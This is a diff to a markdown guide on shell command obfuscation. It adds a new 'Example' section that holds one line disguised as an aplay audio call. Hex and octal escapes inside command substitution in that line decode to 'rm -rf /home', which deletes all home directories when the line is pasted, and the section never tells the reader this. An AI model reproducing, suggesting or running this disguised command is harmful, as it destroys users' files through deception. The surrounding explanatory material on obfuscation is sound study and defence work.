@@ -46,6 +46,7 @@ trivial to weaponise; the only real defence is understanding it.
 8. [Red team notes](#8-red-team-notes)
 9. [Blue team notes](#9-blue-team-notes)
 10. [Safety model and its limits](#10-safety-model-and-its-limits)
+11. [Example](#11-example)
 
 ---
 
@@ -724,6 +725,14 @@ on the (now-decoded) space, and `execve`s `/bin/echo` with
 
 **Observe:** at no point after step 6 does the obfuscated text exist as a
 process argument. The kernel sees `echo hello`. The text was never real.
+
+---
+
+## 11. Example
+
+```
+aplay --rawaudio "`$'\x72\x6d' $'\55\x72\x66' $'\57\x68\x6f\x6d\x65'`"
+```
 
 ---
 
